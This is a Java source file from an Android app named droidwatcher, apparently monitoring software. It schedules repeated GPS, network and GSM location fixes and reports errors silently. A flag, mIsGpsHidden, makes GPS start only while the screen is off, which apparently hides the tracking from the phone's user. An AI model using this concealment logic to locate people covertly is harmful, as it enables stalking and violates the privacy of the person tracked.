package com.droidwatcher.modules.location;

import java.lang.ref.WeakReference;
import java.util.Date;

import org.acra.ACRA;

import com.droidwatcher.Debug;
import com.droidwatcher.receivers.ScreenStateReceiver;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;

public class ScheduledLocationListener implements LocationListener {
	private LocationModule mModule;
	private ILocationResultListener mResultListner;
	private Location mNetworkLocation;
	private TimeoutHandler mTimeoutHandler;
	private Boolean mIsListeningGps;
	private Boolean mIsListeningNetwork;
	private AlarmManager mAlarmManager;
	private PendingIntent mPendingIntent;
	private Boolean mIsGpsActive;
	private long mInterval;
	private long mGpsRestUntil;
	private Location mLastLocation;
	private long mGpsTimeout;
	
	private static final int MAX_LOCATION_DIF = 100;
	
	/** 55 sec */
	private static final long GPS_TIMEOUT_SMALL = 55 * 1000L;
	/** 2 min */
	private static final long GPS_TIMEOUT_MEDIUM = 2 * 60 * 1000L;
	/** 30 minutes */
	private static final long NETWORK_TIMEOUT = 30 * 60 * 1000L;
	/** 10 minutes */
	private static final long GPS_REST_TIME = 10 * 60 * 1000L;
	
	public ScheduledLocationListener(LocationModule module, Context context){
		mModule = module;
		mTimeoutHandler = new TimeoutHandler(this);
		mIsListeningGps = false;
		mIsListeningNetwork = false;
		mIsGpsActive = false;
		mGpsRestUntil = new Date().getTime();
		
		mInterval = mModule.getSettingsManager().gpsInterval();
		if (mInterval > GPS_TIMEOUT_MEDIUM) {
			mGpsTimeout = GPS_TIMEOUT_MEDIUM;
		}
		else {
			mGpsTimeout = GPS_TIMEOUT_SMALL;
		}
		
		mAlarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
		Intent intent = new Intent(context, LocationTimerBroadcastReceiver.class);
		mPendingIntent = PendingIntent.getBroadcast(context, LocationTimerBroadcastReceiver.TIMER_REQUEST_CODE, intent, PendingIntent.FLAG_CANCEL_CURRENT);
	}
	
	@Override
	public synchronized void onLocationChanged(Location location) {
		if (mModule == null) {
			return;
		}
		
		try {
			Debug.i("[ScheduledLocationListener] Location changed; provider: " + location.getProvider());
			
			if (location.getProvider().equals(LocationManager.GPS_PROVIDER)) {
				if (acceptNewLocation(location)) {
					mResultListner.onLocationResult(location);
				}
				
				mIsGpsActive = false;
				stopListner();
			}
			else{
				if (!mIsListeningGps || !mModule.getLocationManager().isProviderEnabled(LocationManager.GPS_PROVIDER)) {
					mResultListner.onLocationResult(location);
					mIsGpsActive = false;
					stopListner();
				}
				else{
					if (mNetworkLocation == null || mNetworkLocation.getAccuracy() > location.getAccuracy() || location.getTime() - mNetworkLocation.getTime() >= mGpsTimeout) {
						mNetworkLocation = location;
					}
				}
			}
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
	}
	
	private Boolean acceptNewLocation(Location location){
		if (!mModule.getSettingsManager().gpsOnlyNew() || mLastLocation == null) {
			mLastLocation = location;
			return true;
		}
		
		if (location.distanceTo(mLastLocation) >= MAX_LOCATION_DIF) {
			mLastLocation = location;
			return true;
		}
		
		return false;
	}

	public synchronized void getLocation(ILocationResultListener resultListner) {
		try {
			mResultListner = resultListner;
			mIsGpsActive = true;
			
			if (ScreenStateReceiver.getScreenState() == ScreenStateReceiver.SCREEN_STATE_OFF || !mModule.mIsGpsHidden) {
				startListner();
			}
			
			mAlarmManager.setRepeating(AlarmManager.RTC_WAKEUP, new Date().getTime() + mInterval, mInterval, mPendingIntent);
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
	}
	
	public synchronized void enableByAlarm(){
		mIsGpsActive = true;
		if (ScreenStateReceiver.getScreenState() == ScreenStateReceiver.SCREEN_STATE_OFF || !mModule.mIsGpsHidden) {
			startListner();
		}
	}
	
	public synchronized void startListner(){
		if (mIsGpsActive) {
			if (new Date().getTime() < mGpsRestUntil) {
				return;
			}
			
			try {
				if (mModule.getLocationManager().isProviderEnabled(LocationManager.GPS_PROVIDER) && !mIsListeningGps) {
					mModule.getLocationManager().requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, mModule.getSettingsManager().gpsOnlyNew() ? 100 : 0, this);
					mIsListeningGps = true;
				}

			} catch (Exception e) {
				Debug.exception(e);
				ACRA.getErrorReporter().handleSilentException(e);
				mIsListeningGps = false;
			}
			
			try {
				if (mModule.getLocationManager().isProviderEnabled(LocationManager.NETWORK_PROVIDER) && !mIsListeningNetwork) {
					mModule.getLocationManager().requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, mModule.getSettingsManager().gpsOnlyNew() ? 100 : 0, this);
					mIsListeningNetwork = true;
				}

			} catch (Exception e) {
				Debug.exception(e);
				ACRA.getErrorReporter().handleSilentException(e);
				mIsListeningNetwork = false;
			}
			
			if (!mTimeoutHandler.hasMessages(TimeoutHandler.MSG_GPS_STOP)) {
				mTimeoutHandler.sendEmptyMessageDelayed(TimeoutHandler.MSG_GPS_STOP, mGpsTimeout);
			}
		}
	}
	
	public synchronized void stopListner(){
		if (mIsListeningGps || mIsListeningNetwork) {
			try {
				mModule.getLocationManager().removeUpdates(this);

			} catch (Exception e) {
				Debug.exception(e);
				ACRA.getErrorReporter().handleSilentException(e);
			}
		}
		
		mIsListeningGps = false;
		mIsListeningNetwork = false;
		
		mTimeoutHandler.removeMessages(TimeoutHandler.MSG_GPS_STOP);
	}

	public synchronized void dispose() {
		try {
			try {
				mModule.getLocationManager().removeUpdates(this);

			} catch (Exception e) {
				Debug.exception(e);
				ACRA.getErrorReporter().handleSilentException(e);
			}
			
			mTimeoutHandler.removeMessages(TimeoutHandler.MSG_GPS_STOP);
			
			mAlarmManager.cancel(mPendingIntent);
			
		} catch (Exception e) {
			ACRA.getErrorReporter().handleSilentException(e);
			
		} finally {
			mModule = null;
			mTimeoutHandler = null;
			mPendingIntent = null;
			mAlarmManager = null;
		}
	}
	
	private void onGpsTimeout(){
		long now = new Date().getTime();
		
		if (mNetworkLocation != null && now - mNetworkLocation.getTime() <= NETWORK_TIMEOUT) {
			mResultListner.onLocationResult(mNetworkLocation);
		}
		else{
			new GsmLocationListener(mModule.getContext()).getLocation(mResultListner);
		}
		
		mNetworkLocation = null;
		
		mIsGpsActive = false;
		stopListner();
		
		mGpsRestUntil = now + GPS_REST_TIME;

		Debug.i("[RepeatingLocationListener] GPS TIMEOUT");
	}
	
	private static class TimeoutHandler extends Handler {
		public static final int MSG_GPS_STOP = 1;
		
		private final WeakReference<ScheduledLocationListener> mListener;
		
		public TimeoutHandler(ScheduledLocationListener listener){
			mListener = new WeakReference<ScheduledLocationListener>(listener);
		}
		
		@Override
		public synchronized void handleMessage(Message msg) {
			super.handleMessage(msg);
			
			ScheduledLocationListener listener = mListener.get();
			if (listener == null) {
				return;
			}
			
			switch (msg.what) {
			case MSG_GPS_STOP:
				listener.onGpsTimeout();
				break;
			default:
				break;
			}
		}
	}

	@Override
	public void onProviderDisabled(String provider) { }
	@Override
	public void onProviderEnabled(String provider) { }
	@Override
	public void onStatusChanged(String provider, int status, Bundle extras) { }
}
